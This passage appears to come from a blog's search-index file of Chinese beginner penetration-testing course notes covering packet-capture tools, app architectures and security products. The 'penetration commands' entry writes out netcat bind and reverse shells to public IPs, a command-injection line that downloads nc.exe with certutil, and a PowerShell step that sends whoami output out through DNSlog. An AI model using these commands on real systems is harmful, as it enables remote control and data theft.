href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a><br><a href="https://utf-8.jp/public/aaencode.html">https://utf-8.jp/public/aaencode.html</a><br><a href="https://github.com/guyoung/CaptfEncoder">https://github.com/guyoung/CaptfEncoder</a>  </p></li><li><p>8.30余种加密编码类型的密文特征分析（建议收藏）<br><a href="https://mp.weixin.qq.com/s?__biz=MzAwNDcxMjI2MA==&mid=2247484455&idx=1&sn=e1b4324ddcf7d6123be30d9a5613e17b&chksm=9b26f60cac517f1a920cf3b73b3212a645aeef78882c47957b9f3c2135cb7ce051c73fe77bb2&mpshare=1&scene=23&srcid=1111auAYWmr1N0NAs9Wp2hGz&sharer_sharetime=1605145141579&sharer_shareid=5051b3eddbbe2cb698aedf9452370026#rd">https://mp.weixin.qq.com/s?__biz=MzAwNDcxMjI2MA==&amp;mid=2247484455&amp;idx=1&amp;sn=e1b4324ddcf7d6123be30d9a5613e17b&amp;chksm=9b26f60cac517f1a920cf3b73b3212a645aeef78882c47957b9f3c2135cb7ce051c73fe77bb2&amp;mpshare=1&amp;scene=23&amp;srcid=1111auAYWmr1N0NAs9Wp2hGz&amp;sharer_sharetime=1605145141579&amp;sharer_shareid=5051b3eddbbe2cb698aedf9452370026#rd</a>  </p></li><li><p>9.CTF中常见密码题解密网站总结（建议收藏）<br><a href="https://blog.csdn.net/qq_41638851/article/details/100526839">https://blog.csdn.net/qq_41638851/article/details/100526839</a>  </p></li><li><p>10.CTF密码学常见加密解密总结（建议收藏）<br><a href="https://blog.csdn.net/qq_40837276/article/details/83080460">https://blog.csdn.net/qq_40837276/article/details/83080460</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6、7基础入门-抓包技术</title>
      <link href="/2023/10/02/6%E3%80%817%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%8A%93%E5%8C%85%E6%8A%80%E6%9C%AF/"/>
      <url>/2023/10/02/6%E3%80%817%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%8A%93%E5%8C%85%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/02/1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%BA%94%E7%94%A8%E6%9E%B6%E6%9E%84/">1基础入门</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>9、抓包技术-HTTP&#x2F;S-Web &amp; APP &amp; 小程序 &amp; PC应用等</li><li>10、抓包工具-Burp &amp; Fidder &amp; Charles &amp; Proxifier</li><li>11、抓包技术-全局-APP&amp;小程序&amp;PC应用</li><li>12、抓包工具-Wireshark&amp;科来分析&amp;封包</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>应用架构：Web&#x2F;APP&#x2F;云应用&#x2F;小程序&#x2F;负载均衡等</li><li>安全产品：CDN&#x2F;WAF&#x2F;IDS&#x2F;IPS&#x2F;蜜罐&#x2F;防火墙&#x2F;杀毒等</li><li>渗透命令：文件上传下载&#x2F;端口服务&#x2F;Shell反弹等</li><li>抓包技术：HTTP&#x2F;TCP&#x2F;UDP&#x2F;ICMP&#x2F;DNS&#x2F;封包&#x2F;代理等</li><li>算法加密：数据编码&#x2F;密码算法&#x2F;密码保护&#x2F;反编译&#x2F;加壳等</li></ul><h2 id="工具的介绍和使用"><a href="#工具的介绍和使用" class="headerlink" title="工具的介绍和使用"></a>工具的介绍和使用</h2><h3 id="准备工作："><a href="#准备工作：" class="headerlink" title="准备工作："></a>准备工作：</h3><ul><li>1、浏览器安装证书：解决本地抓HTTPS</li><li>2、模拟器安装证书：解决模拟器抓HTTPS</li><li>3、安装科来网络分析系统&amp;WireShark</li></ul><h3 id="实现目的："><a href="#实现目的：" class="headerlink" title="实现目的："></a>实现目的：</h3><ul><li>1、掌握几种抓包工具证书安装操作</li><li>2、掌握几种HTTP&#x2F;S抓包工具的使用</li><li>3、学会Web,APP,小程序,PC应用等抓包</li><li>4、了解此课抓包是针对那些目标什么协议</li></ul><h3 id="Fiddler："><a href="#Fiddler：" class="headerlink" title="Fiddler："></a>Fiddler：</h3><p><a href="https://www.telerik.com/fiddler">https://www.telerik.com/fiddler</a><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;描述：是一个http协议调试代理工具，它能够记录并检查所有你的电脑和互联网之间的http通讯，设置断点，查看所有的“进出”Fiddler的数据（指cookie,html,js,css等文件）。 Fiddler 要比其他的网络调试器要更加简单，因为它不仅仅暴露http通讯还提供了一个用户友好的格式。</p><h3 id="Charles："><a href="#Charles：" class="headerlink" title="Charles："></a>Charles：</h3><p><a href="https://www.charlesproxy.com/">https://www.charlesproxy.com/</a><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;描述：是一个HTTP代理服务器,HTTP监视器,反转代理服务器，当浏览器连接Charles的代理访问互联网时，Charles可以监控浏览器发送和接收的所有数据。它允许一个开发者查看所有连接互联网的HTTP通信，这些包括request, response和HTTP headers （包含cookies与caching信息）。<br>（charles包发给burp–external proxy）</p><h3 id="TCPDump："><a href="#TCPDump：" class="headerlink" title="TCPDump："></a>TCPDump：</h3><p><a href="https://cloud.tencent.com/developer/article/1589827">https://cloud.tencent.com/developer/article/1589827</a><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;描述：是可以将网络中传送的数据包完全截获下来提供分析。它支持针对网络层、协议、主机、网络或端口的过滤，并提供and、or、not等逻辑语句来帮助你去掉无用的信息。</p><h3 id="BurpSuite："><a href="#BurpSuite：" class="headerlink" title="BurpSuite："></a>BurpSuite：</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;描述：是用于攻击web 应用程序的集成平台，包含了许多工具。Burp Suite为这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。</p><h3 id="Wireshark："><a href="#Wireshark：" class="headerlink" title="Wireshark："></a>Wireshark：</h3><p><a href="https://www.wireshark.org/">https://www.wireshark.org/</a><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;描述：是一个网络封包分析软件。网络封包分析软件的功能是截取网络封包，并尽可能显示出最为详细的网络封包资料。Wireshark使用WinPCAP作为接口，直接与网卡进行数据报文交换。</p><h3 id="科来网络分析系统："><a href="#科来网络分析系统：" class="headerlink" title="科来网络分析系统："></a>科来网络分析系统：</h3><p><a href="https://www.colasoft.com.cn/">https://www.colasoft.com.cn/</a><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;描述：是一款由科来软件全自主研发，并拥有全部知识产品的网络分析产品。该系统具有行业领先的专家分析技术，通过捕获并分析网络中传输的底层数据包，对网络故障、网络安全以及网络性能进行全面分析，从而快速排查网络中出现或潜在的故障、安全及性能问题。</p><h3 id="WPE-封包分析："><a href="#WPE-封包分析：" class="headerlink" title="WPE&amp;封包分析："></a>WPE&amp;封包分析：</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;描述：是强大的网络封包编辑器，wpe可以截取网络上的信息，修改封包数据，是外挂制作的常用工具。一般在安全测试中可用来调试数据通讯地址。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>5基础入门-渗透命令</title>
      <link href="/2023/10/02/5%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%B8%97%E9%80%8F%E5%91%BD%E4%BB%A4/"/>
      <url>/2023/10/02/5%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%B8%97%E9%80%8F%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/02/1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%BA%94%E7%94%A8%E6%9E%B6%E6%9E%84/">1基础入门</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>6、渗透命令-常规命令&amp;文件上传下载</li><li>7、反弹Shell-防火墙策略&amp;正反向连接</li><li>8、数据回显-查询带外&amp;网络协议层级</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>应用架构：Web&#x2F;APP&#x2F;云应用&#x2F;小程序&#x2F;负载均衡等</li><li>安全产品：CDN&#x2F;WAF&#x2F;IDS&#x2F;IPS&#x2F;蜜罐&#x2F;防火墙&#x2F;杀毒等</li><li>渗透命令：文件上传下载&#x2F;端口服务&#x2F;Shell反弹等</li><li>抓包技术：HTTP&#x2F;TCP&#x2F;UDP&#x2F;ICMP&#x2F;DNS&#x2F;封包&#x2F;代理等</li><li>算法加密：数据编码&#x2F;密码算法&#x2F;密码保护&#x2F;反编译&#x2F;加壳等</li></ul><p> <img src="/2023/10/02/5%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E6%B8%97%E9%80%8F%E5%91%BD%E4%BB%A4/%E6%AD%A3%E5%8F%8D%E5%90%91%E8%BF%9E%E6%8E%A5.png" alt="正反向连接"></p><h2 id="常规基本渗透命令详解"><a href="#常规基本渗透命令详解" class="headerlink" title="常规基本渗透命令详解"></a>常规基本渗透命令详解</h2><p>&nbsp;&nbsp;&nbsp;&nbsp; <a href="https://blog.csdn.net/weixin_43303273/article/details/83029138">https://blog.csdn.net/weixin_43303273/article/details/83029138</a>  </p><h2 id="实用案例1：文件上传下载-解决无图形化-解决数据传输"><a href="#实用案例1：文件上传下载-解决无图形化-解决数据传输" class="headerlink" title="实用案例1：文件上传下载-解决无图形化&amp;解决数据传输"></a>实用案例1：文件上传下载-解决无图形化&amp;解决数据传输</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;命令生成：<a href="https://forum.ywhack.com/bountytips.php?download">https://forum.ywhack.com/bountytips.php?download</a><br>&nbsp;&nbsp;&nbsp;&nbsp;Linux：wget curl python ruby perl java等<br>&nbsp;&nbsp;&nbsp;&nbsp;Windows：PowerShell Certutil Bitsadmin msiexec mshta rundll32等  </p><h2 id="实用案例2：反弹Shell命令-解决数据回显-解决数据通讯"><a href="#实用案例2：反弹Shell命令-解决数据回显-解决数据通讯" class="headerlink" title="实用案例2：反弹Shell命令-解决数据回显&amp;解决数据通讯"></a>实用案例2：反弹Shell命令-解决数据回显&amp;解决数据通讯</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;命令生成：<a href="https://forum.ywhack.com/shell.php">https://forum.ywhack.com/shell.php</a>  </p><ul><li>1、正向连接：本地监听等待对方连接<br>&nbsp;&nbsp;&nbsp;&nbsp;Linux控制Windows</li></ul><p><code>nc -e cmd -lvp 5566    //windows绑定CMD到本地5566端口</code><br><code>ncat 47.122.23.131 5566    //linux主动连接目标windows5566端口</code>  </p><p>&nbsp;&nbsp;&nbsp;&nbsp;Windows控制Linux  </p><p><code>ncat -e /bin/sh -lvp 5566    //linux绑定SH到本地5566端口</code>  </p><p><code>nc 47.94.236.117 5566    //windows主动连接目标linux5566端口</code>  </p><ul><li>2、反向连接：主动给出去，对方监听<br>&nbsp;&nbsp;&nbsp;&nbsp; Windows控制Linux</li></ul><p><code>ncat -e /bin/sh 47.122.23.131 5566    //linux绑定SH到目标windows5566端口</code><br><code>nc -lvvp 5566    //windows监听5566端口，等待linux5566连接</code><br>&nbsp;&nbsp;&nbsp;&nbsp;Linux控制Windows<br><code>nc -e cmd 47.94.236.117 5566    //windows绑定CMD到目标linux5566端口</code><br><code>ncat -lvvp 5566    //linux监听5566端口，等待windows目标连接</code>  </p><h2 id="实际案例1：防火墙绕过-正向连接-反向连接-内网服务器"><a href="#实际案例1：防火墙绕过-正向连接-反向连接-内网服务器" class="headerlink" title="实际案例1：防火墙绕过-正向连接&amp;反向连接&amp;内网服务器"></a>实际案例1：防火墙绕过-正向连接&amp;反向连接&amp;内网服务器</h2><ul><li><p>1、判断windows</p></li><li><p>2、windows没有自带的nc</p></li><li><p>3、想办法上传nc 反弹权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | certutil.exe -urlcache -split -f http://101.133.139.57:80/nc.exe c://nc.exe  </span><br></pre></td></tr></table></figure></li><li><p>4、反弹<br>开启入站策略，采用反向连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ncat -lvp 5566    //攻击机linux监听本地端口5566  </span><br><span class="line">127.0.0.1 | c:\\nc.exe -e cmd 101.133.139.57 5566    //window目标主机主动连接linux主机  </span><br></pre></td></tr></table></figure><p>开启出站策略，采用正向连接：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1 | c:\\nc.exe -e cmd -lvp 5566    //windows本地绑定cmd 5566端口  </span><br><span class="line">ncat 43.154.116.147 5566    //linux去连接目标主机  </span><br></pre></td></tr></table></figure><p>正反向反弹案例-内网服务器<br>只能内网主动交出数据，反向连接<br>出站入站都开启策略（数据不回显）：OSI网络七层</p></li></ul><h2 id="实际案例2：防火墙组合数据不回显-ICMP带外查询Dnslog"><a href="#实际案例2：防火墙组合数据不回显-ICMP带外查询Dnslog" class="headerlink" title="实际案例2：防火墙组合数据不回显-ICMP带外查询Dnslog"></a>实际案例2：防火墙组合数据不回显-ICMP带外查询Dnslog</h2><h3 id="1-管道符"><a href="#1-管道符" class="headerlink" title="1.管道符"></a>1.管道符</h3><p>管道符：| (管道符号) ||（逻辑或） &amp;&amp;（逻辑与）  &amp;(后台任务符号)<br>Windows-&gt;| &amp; || &amp;&amp;<br>Linux-&gt;; | || &amp; &amp;&amp; &#96;&#96;<br>例子：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ping -c 1 127.0.0.1 ; whoami  </span><br><span class="line">ping -c 1 127.0.0.1 | whoami  </span><br><span class="line">ping -c 1 127.0.0.1 || whoami  </span><br><span class="line">ping -c 1 127.0.0.1 &amp; whoami  </span><br><span class="line">ping -c 1 127.0.0.1 &amp;&amp; whoami  </span><br><span class="line">ping -c 1 127.0.0.1 `whoami`  </span><br></pre></td></tr></table></figure><h3 id="2-利用powershell进行带外查询"><a href="#2-利用powershell进行带外查询" class="headerlink" title="2.利用powershell进行带外查询"></a>2.利用powershell进行带外查询</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;描述：windows系统cmd无法执行whoami，用到powershell变量赋值把whoami执行结果给变量，结果带有“\” 导致ping无法执行<br>&nbsp;&nbsp;&nbsp;&nbsp;powershell命令：  </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$x=whoami;</span><br><span class="line">$x=$x.Replace(&#x27;\&#x27;,&#x27;xxx&#x27;);</span><br><span class="line">$y=&#x27;.thec6z.dnslog.cn&#x27;;</span><br><span class="line">$z=$x+$y;</span><br><span class="line">ping $z</span><br><span class="line">127.0.0.1 | powershell </span><br><span class="line">$x=ver;</span><br><span class="line">$x=$x.Replace(&#x27;\&#x27;,&#x27;xxx&#x27;);</span><br><span class="line">$y=&#x27;.vpod5d.dnslog.cn&#x27;;</span><br><span class="line">$z=$x+$y;</span><br><span class="line">ping $z  </span><br></pre></td></tr></table></figure><h3 id="3-DNSlog平台接收数据"><a href="#3-DNSlog平台接收数据" class="headerlink" title="3.DNSlog平台接收数据"></a>3.DNSlog平台接收数据</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;<a href="http://www.dnslog.cn/">http://www.dnslog.cn/</a></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>4基础入门-app架构</title>
      <link href="/2023/10/02/4%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-app%E6%9E%B6%E6%9E%84/"/>
      <url>/2023/10/02/4%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-app%E6%9E%B6%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/02/1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%BA%94%E7%94%A8%E6%9E%B6%E6%9E%84/">1基础入门</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>4、APP架构-封装 &amp; 原生态 &amp; H5 &amp; flutter等</li><li>5、小程序架构-Web &amp; H5 &amp; JS &amp; VUE框架等</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>应用架构：Web&#x2F;APP&#x2F;云应用&#x2F;小程序&#x2F;负载均衡等</li><li>安全产品：CDN&#x2F;WAF&#x2F;IDS&#x2F;IPS&#x2F;蜜罐&#x2F;防火墙&#x2F;杀毒等</li><li>渗透命令：文件上传下载&#x2F;端口服务&#x2F;Shell反弹等</li><li>抓包技术：HTTP&#x2F;TCP&#x2F;UDP&#x2F;ICMP&#x2F;DNS&#x2F;封包&#x2F;代理等</li><li>算法加密：数据编码&#x2F;密码算法&#x2F;密码保护&#x2F;反编译&#x2F;加壳等</li></ul><h2 id="APP应用开发架构："><a href="#APP应用开发架构：" class="headerlink" title="APP应用开发架构："></a>APP应用开发架构：</h2><ul><li>1、原生开发<br>&nbsp;&nbsp;&nbsp;&nbsp;安卓一般使用java语言开发，当然现在也有kotlin语言进行开发。如何开发就涉及到具体编程了，这里就不详说了。简单描述就是使用安卓提供的一系列控件来实现页面，复杂点的页面可以通过自定义控件来实现。</li><li>2、使用H5语言开发<br>&nbsp;&nbsp;&nbsp;&nbsp;使用H5开发的好处有很多，可多端复用，比如浏览器端，ios端，当然H5开发的体验是没有原生好的。结合我做过的项目来说，一般是这个页面需要分享出去的话，就用H5开发。</li><li>3、使用flutter开发<br>&nbsp;&nbsp;&nbsp;&nbsp;flutter是近年来谷歌推出的一款UI框架，使用dart语言进行开发，支持跨平台，weight渲染直接操作硬件层，体验可媲美原生。但是flutter技术比较新，生态还不完善，开发起来效率相对偏低。</li><li>4、常规Web开发<br>&nbsp;&nbsp;&nbsp;&nbsp;Web App软件开发简单地说，就是开发一个网站，然后加入app的壳。Web App一般非常小，内容都是app内的网页展示，受制于网页技术本身，可实现功能少，而且每次打开，几乎所有的内容都需要重新加载，所以反应速度慢，内容加载过多就容易卡死，用户体验差，而且app内的交互设计等非常有效。但开发周期长端，需要的技术人员少，成本低。</li></ul><h2 id="APP-开发架构-原生态-IDEA"><a href="#APP-开发架构-原生态-IDEA" class="headerlink" title="APP-开发架构-原生态-IDEA"></a>APP-开发架构-原生态-IDEA</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;演示：remusic项目源码<br>&nbsp;&nbsp;&nbsp;&nbsp;安全影响：反编译&amp;抓包&amp;常规测试<br>&nbsp;&nbsp;&nbsp;&nbsp;安全影响：逆向的角度去分析逻辑设计安全  </p><h2 id="APP-开发架构–Web封装-封装平台"><a href="#APP-开发架构–Web封装-封装平台" class="headerlink" title="APP-开发架构–Web封装-封装平台"></a>APP-开发架构–Web封装-封装平台</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;演示：ShopXO源码程序+一门APP打包<br>&nbsp;&nbsp;&nbsp;&nbsp;安全影响：常Web安全测试</p><h2 id="APP-开发架构-H5-Vue-HBuilderX"><a href="#APP-开发架构-H5-Vue-HBuilderX" class="headerlink" title="APP-开发架构-H5&amp;Vue-HBuilderX"></a>APP-开发架构-H5&amp;Vue-HBuilderX</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;演示：HBuilderX案例<br>&nbsp;&nbsp;&nbsp;&nbsp;安全影响：API&amp;JS框架安全问题&amp;JS前端测  试</p><h2 id="WX小程序-开发架构-Web封装-平台"><a href="#WX小程序-开发架构-Web封装-平台" class="headerlink" title="WX小程序-开发架构-Web封装-平台"></a>WX小程序-开发架构-Web封装-平台</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;演示：ShopXO源码程序+一门APP打包<br>&nbsp;&nbsp;&nbsp;&nbsp;安全影响：常规Web安全测试  </p><h2 id="WX小程序-开发架构-H5-Vue-HBuilderX"><a href="#WX小程序-开发架构-H5-Vue-HBuilderX" class="headerlink" title="WX小程序-开发架构-H5&amp;Vue-HBuilderX"></a>WX小程序-开发架构-H5&amp;Vue-HBuilderX</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;演示：HBuilderX案例<br>&nbsp;&nbsp;&nbsp;&nbsp;安全影响：API&amp;JS框架安全问题&amp;JS前端测试  </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3基础入门-安全产品</title>
      <link href="/2023/10/02/3%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81/"/>
      <url>/2023/10/02/3%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/02/1%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%BA%94%E7%94%A8%E6%9E%B6%E6%9E%84/">1基础入门</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>1、Web常规-系统 &amp; 中间件 &amp; 数据库 &amp; 源码等</li><li>2、Web其他-前后端 &amp; 软件 &amp; Docker &amp; 分配站等</li><li>3、Web拓展-CDN &amp; WAF &amp; OSS &amp; 反向 &amp; 负载均衡等</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>应用架构：Web&#x2F;APP&#x2F;云应用&#x2F;三方服务&#x2F;负载均衡等</li><li>安全产品：CDN&#x2F;WAF&#x2F;IDS&#x2F;IPS&#x2F;蜜罐&#x2F;防火墙&#x2F;杀毒等</li><li>渗透命令：文件上传下载&#x2F;端口服务&#x2F;Shell反弹等</li><li>抓包技术：HTTP&#x2F;TCP&#x2F;UDP&#x2F;ICMP&#x2F;DNS&#x2F;封包&#x2F;代理等</li><li>算法加密：数据编码&#x2F;密码算法&#x2F;密码保护&#x2F;反编译&#x2F;加壳等</li></ul><h2 id="WAF"><a href="#WAF" class="headerlink" title="WAF"></a>WAF</h2><p><img src="/2023/10/02/3%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81/waf.png" alt="WAF"><br>&nbsp;&nbsp;&nbsp;&nbsp;原理：Web应用防火墙，旨在提供保护<br>&nbsp;&nbsp;&nbsp;&nbsp;影响：常规Web安全测试手段会受到拦截<br>&nbsp;&nbsp;&nbsp;&nbsp;演示：免费D盾防护软件<br>&nbsp;&nbsp;&nbsp;&nbsp;Windows2012 + IIS +D盾<br>&nbsp;&nbsp;&nbsp;&nbsp;(基本没漏洞，遇到就跑)</p><h2 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h2><p><img src="/2023/10/02/3%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81/cdn.png" alt="WAF"><br>&nbsp;&nbsp;&nbsp;&nbsp;分发网络CDN（Content Delivery Network）是建立并覆盖在承载网之上，由遍布全球的边缘节点服务器群组成的分布式网络。阿里云CDN能分担源站压力，避免网络拥塞，确保在不同区域、不同场景下加速网站内容的分发，提高资源访问速度。<br>&nbsp;&nbsp;&nbsp;&nbsp;原理：内容分发服务，旨在提高访问速度<br>&nbsp;&nbsp;&nbsp;&nbsp;影响：隐藏真实源IP，导致对目标测试错误<br>&nbsp;&nbsp;&nbsp;&nbsp;演示：阿里云备案域名全局CDN加速服务<br>&nbsp;&nbsp;&nbsp;&nbsp;Windows2012 + BT宝塔面板 + CDN服务<br>&nbsp;&nbsp;&nbsp;&nbsp;常见的获取网站真实IP的途径：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;超级ping<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;获取子域名ip<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;海外测试<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;查看自建邮件ip<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;网络搜索引擎搜索（可能存在历史ip，再未部署cdn之前记录的）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ip库fuzz（概率不大，并且需要跑的内容过于庞大）<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;……<br>&nbsp;&nbsp;&nbsp;&nbsp;在获取到真实ip之后，即可绑定本地host，使用漏扫工具等进行测试。  </p><h2 id="OSS"><a href="#OSS" class="headerlink" title="OSS"></a>OSS</h2><p> <img src="/2023/10/02/3%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81/oss.png" alt="OSS"><br>&nbsp;&nbsp;&nbsp;&nbsp;原理：云存储服务，旨在提高访问速度<br>&nbsp;&nbsp;&nbsp;&nbsp;影响： 无法进行getshell等操作，但是可以通过获取osskey进行储存桶权限接管，直接得到oss权限<br>&nbsp;&nbsp;&nbsp;&nbsp;演示：<a href="https://cloudreve.org/">https://cloudreve.org/</a><br>&nbsp;&nbsp;&nbsp;&nbsp;Windows2012 + cloudreve + 阿里云OSS<br>&nbsp;&nbsp;&nbsp;&nbsp;<a href="https://github.com/cloudreve/Cloudreve/releases/tag/3.7.1">https://github.com/cloudreve/Cloudreve/releases/tag/3.7.1</a><br>&nbsp;&nbsp;&nbsp;&nbsp;1、启动应用<br>&nbsp;&nbsp;&nbsp;&nbsp;2、登录管理<br>&nbsp;&nbsp;&nbsp;&nbsp;3、配置存储信息<br>&nbsp;&nbsp;&nbsp;&nbsp;4、更改用户组存储属性  </p><p>阿里云OSS:<br>&nbsp;&nbsp;&nbsp;&nbsp;1、开OSS<br>&nbsp;&nbsp;&nbsp;&nbsp;2、新建Bucket<br>&nbsp;&nbsp;&nbsp;&nbsp;3、配置Bucket属性<br>&nbsp;&nbsp;&nbsp;&nbsp;4、配置Access访问  </p><p>原理：<br>为什么要使用第三方存储？<br>&nbsp;&nbsp;&nbsp;&nbsp;1）静态文件会占用大量带宽<br>&nbsp;&nbsp;&nbsp;&nbsp;2）加载速度<br>&nbsp;&nbsp;&nbsp;&nbsp;3）存储空间<br>影响：<br>上传的文件或解析的文件均来自于OSS资源，无法解析，单独存储<br>&nbsp;&nbsp;&nbsp;&nbsp;1、修复上传安全<br>&nbsp;&nbsp;&nbsp;&nbsp;2、文件解析不一样<br>&nbsp;&nbsp;&nbsp;&nbsp;3、存在A ccesskey隐患  </p><h2 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;正代理为客户端服务,客户端主动建立代理访问目标（不代理不可达）<br>反向代理为服务端服务,服务端主动转发数据给可访问地址（不主动不可达）<br>&nbsp;&nbsp;&nbsp;&nbsp;原理：通过网络反向代理转发真实服务达到访问目的<br>&nbsp;&nbsp;&nbsp;&nbsp;影响：访问目标只是一个代理，非真实应用服务器<br>&nbsp;&nbsp;&nbsp;&nbsp;注意：正向代理和反向代理都是解决访问不可达的问题，但由于反向代理中多出一个可以重定向解析的功能操作，导致反代理出的站点指向和真实应用毫无关系！<br>&nbsp;&nbsp;&nbsp;&nbsp;演示：Nginx反向代理配置<br>&nbsp;&nbsp;&nbsp;&nbsp;Windows2012 + BT宝塔面板 + Nginx  </p><h2 id="负载均衡"><a href="#负载均衡" class="headerlink" 